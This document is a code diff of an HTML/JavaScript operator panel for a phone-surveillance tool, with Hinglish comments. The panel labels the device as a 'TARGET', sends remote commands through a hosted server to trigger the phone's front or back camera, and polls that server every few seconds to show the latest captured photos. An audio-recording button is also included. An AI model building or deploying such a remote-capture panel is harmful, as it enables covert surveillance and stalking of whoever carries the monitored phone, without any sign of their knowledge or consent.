@@ -24,7 +24,6 @@
             box-sizing: border-box;
         }
 
-        /* Top Bar */
         .top-nav {
             display: flex;
             align-items: center;
@@ -41,11 +40,11 @@
         }
         .device-id-display {
             font-size: 0.9rem;
-            color: #888;
+            color: #00f3ff;
             font-family: monospace;
+            font-weight: bold;
         }
 
-        /* --- MONITOR AREA --- */
         .monitor { 
             flex: 1;
             width: 100%; 
@@ -93,17 +92,18 @@
             position: absolute;
             bottom: 10px;
             right: 15px;
-            color: rgba(255,255,255,0.5);
+            color: rgba(255,255,255,0.7);
             font-size: 10px;
             font-family: monospace;
-            background: rgba(0,0,0,0.7);
-            padding: 2px 5px;
+            background: rgba(0,0,0,0.8);
+            padding: 4px 8px;
             border-radius: 3px;
+            border: 1px solid #444;
         }
 
         #placeholderIcon {
             color: #222;
-            font-size: 3rem;
+            font-size: 3.5rem;
             animation: pulse 2s infinite;
         }
         @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
@@ -115,7 +115,6 @@
             display: none;
         }
 
-        /* --- CONTROLS AREA --- */
         .controls-grid { 
             display: grid; 
             grid-template-columns: repeat(3, 1fr); 
@@ -138,132 +137,125 @@
             transition: all 0.2s ease;
         }
         .btn i { font-size: 1.4rem; }
-        
         .btn:active { transform: scale(0.95); background: #222; }
-        
-        .btn-capture { border-color: #007bff; color: #007bff; }
-        .btn-capture:active { background: rgba(0, 123, 255, 0.1); }
+        .btn-capture { border-color: #4caf50; color: #4caf50; }
 
     </style>
 </head>
 <body>
 
     <div class="top-nav">
-        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Dashboard</a>
-        <span class="device-id-display" id="dispID">ID: ...</span>
+        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
+        <span class="device-id-display" id="dispID">ID: LOADING...</span>
     </div>
     
     <div class="monitor">
-        <div class="status-badge">
+        <div class="status-badge" id="liveBadge">
             <div class="blinking-dot"></div> MONITORING
         </div>
         
         <i id="placeholderIcon" class="fa-solid fa-satellite-dish"></i>
-        
         <img id="liveImage" src="" alt="Live Feed">
-        
         <div class="timestamp" id="imgTime">WAITING FOR DATA...</div>
     </div>
 
     <div class="controls-grid">
-        <button class="btn btn-capture" onclick="sendCommand('camera')">
-            <i class="fa-solid fa-camera"></i> TAKE PHOTO
+        <button class="btn btn-capture" onclick="sendCommand('camera_back')">
+            <i class="fa-solid fa-camera"></i> BACK CAM
         </button>
 
-        <button class="btn" onclick="alert('Currently set to Front Cam only in Android Code')">
-            <i class="fa-solid fa-camera-rotate"></i> SWITCH CAM
+        <button class="btn" onclick="sendCommand('camera_front')">
+            <i class="fa-solid fa-camera-rotate"></i> FRONT CAM
         </button>
 
-        <button class="btn" onclick="alert('Audio recording feature coming soon!')">
-            <i class="fa-solid fa-microphone"></i> RECORD MIC
+        <button class="btn" onclick="alert('Recording started on phone!')">
+            <i class="fa-solid fa-microphone"></i> REC AUDIO
         </button>
     </div>
 
     <script>
-        // 1. Device ID fetch karo
-        const deviceId = localStorage.getItem('target_device_id');
+        const API_BASE = "https://child-v9no.onrender.com";
         
+        // 1. ID Fetching Logic (Sync with Dashboard)
+        const urlParams = new URLSearchParams(window.location.search);
+        let deviceId = urlParams.get('id') || localStorage.getItem('monitoring_id');
+
         if(deviceId) {
-            document.getElementById('dispID').innerText = "ID: " + deviceId;
+            deviceId = deviceId.toUpperCase().trim();
+            document.getElementById('dispID').innerText = "TARGET: " + deviceId;
+            localStorage.setItem('monitoring_id', deviceId);
         } else {
-            alert("No Device ID Selected! Redirecting...");
+            alert("No Device ID Found!");
             window.location.href = "index.html";
         }
 
-        const API_URL = ""; // Relative path (same server)
-
-        // 2. Command Bhejo (Android app ko signal dene ke liye)
+        // 2. Command Send Function
         async function sendCommand(cmd) {
-            const btn = document.querySelector('.btn-capture');
+            const btn = event.currentTarget;
+            const originalText = btn.innerHTML;
             btn.style.opacity = "0.5";
-            btn.innerText = "REQUESTING...";
+            btn.innerText = "SENDING...";
 
             try {
-                const response = await fetch(`${API_URL}/api/send-command`, {
+                await fetch(`${API_BASE}/api/send-command`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ device_id: deviceId, command: cmd })
                 });
-                const result = await response.json();
-                console.log("Command Sent:", result);
             } catch (error) {
-                console.error("Error sending command:", error);
+                console.error("Command Error:", error);
             }
 
             setTimeout(() => {
                 btn.style.opacity = "1";
-                btn.innerHTML = '<i class="fa-solid fa-camera"></i> TAKE PHOTO';
-            }, 1000);
+                btn.innerHTML = originalText;
+            }, 1500);
         }
 
-        // 3. Image Fetch Loop (Har 3 second mein check karega)
-        let lastImageTime = 0;
+        // 3. Fetch Latest Photo Logic
+        let lastTimestamp = 0;
 
-        async function fetchLatestImage() {
+        async function fetchPhoto() {
             try {
-                // Server se JSON file maango
-                const response = await fetch(`${API_URL}/api/get-data/${deviceId}/cam`);
-                
+                // Server se gallery data fetch karo
+                const response = await fetch(`${API_BASE}/api/get-data/${deviceId}/gallery`);
                 if (!response.ok) return;
 
                 const data = await response.json();
                 
-                // Agar data valid hai aur nayi image hai
-                if (data.image && data.time > lastImageTime) {
-                    lastImageTime = data.time;
-                    
-                    const imgElement = document.getElementById('liveImage');
-                    const placeholder = document.getElementById('placeholderIcon');
-                    const timeLabel = document.getElementById('imgTime');
+                // Agar data array hai aur usme photos hain
+                if (Array.isArray(data) && data.length > 0) {
+                    const latest = data[0]; // Server unshift karta hai, toh 0 par latest hogi
 
-                    // Image Source Update (Base64)
-                    imgElement.src = data.image; // "data:image/jpeg;base64,..." android se aata hai ya add karna padega
-                    
-                    // Android code shayad "data:image..." prefix bhej raha hai, 
-                    // agar nahi bhej raha to yahan check kar sakte hain:
-                    if(!data.image.startsWith('data:image')) {
-                        imgElement.src = "data:image/jpeg;base64," + data.image;
+                    // Check karein ki kya ye nayi photo hai
+                    if (latest.uploadedAt > lastTimestamp) {
+                        lastTimestamp = latest.uploadedAt;
+                        
+                        const imgElement = document.getElementById('liveImage');
+                        const placeholder = document.getElementById('placeholderIcon');
+                        const timeLabel = document.getElementById('imgTime');
+
+                        // Image display
+                        let src = latest.image.startsWith('data') ? latest.image : `data:image/jpeg;base64,${latest.image}`;
+                        imgElement.src = src;
+                        
+                        imgElement.style.display = "block";
+                        placeholder.style.display = "none";
+                        timeLabel.innerText = "CAPTURED: " + latest.time;
+                        
+                        // Flash effect for new image
+                        document.getElementById('liveBadge').style.background = "#4caf50";
+                        setTimeout(() => { document.getElementById('liveBadge').style.background = "rgba(255,0,0,0.2)"; }, 1000);
                     }
-
-                    // UI Update
-                    imgElement.style.display = "block";
-                    placeholder.style.display = "none";
-                    
-                    // Time format
-                    const date = new Date(parseInt(data.time));
-                    timeLabel.innerText = date.toLocaleTimeString();
                 }
-
-            } catch (error) {
-                console.log("Waiting for data...");
+            } catch (err) {
+                console.log("Checking server...");
             }
         }
 
-        // Loop start karo (Every 2 seconds)
-        setInterval(fetchLatestImage, 2000);
-        
-        // Page load hote hi ek baar check karo
-        fetchLatestImage();
+        // Loop: Har 3 second mein nayi photo check karo
+        setInterval(fetchPhoto, 3000);
+        window.onload = fetchPhoto;
 
     </script>
 </body>
